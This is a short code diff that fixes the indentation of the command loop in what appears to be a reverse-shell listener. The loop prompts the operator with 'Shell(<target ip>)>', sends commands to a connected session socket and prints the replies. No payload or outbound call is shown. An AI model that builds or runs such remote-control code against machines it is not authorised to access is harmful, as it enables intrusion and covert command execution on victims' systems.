@@ -42,10 +42,10 @@ def start_server():
                                 remote_cmd = input(f"Shell({target_ips[session_id][0]})> ")
                                 if remote_cmd == 'exit':
                                     break
-                            if len(remote_cmd) > 0:
-                                conn.send(remote_cmd.encode())
-                                response = conn.recv(4096).decode('utf-8')
-                                print(response)
+                                if len(remote_cmd) > 0:
+                                    conn.send(remote_cmd.encode())
+                                    response = conn.recv(4096).decode('utf-8')
+                                    print(response)
                         except:
                                 print("Invalid session ID")
 
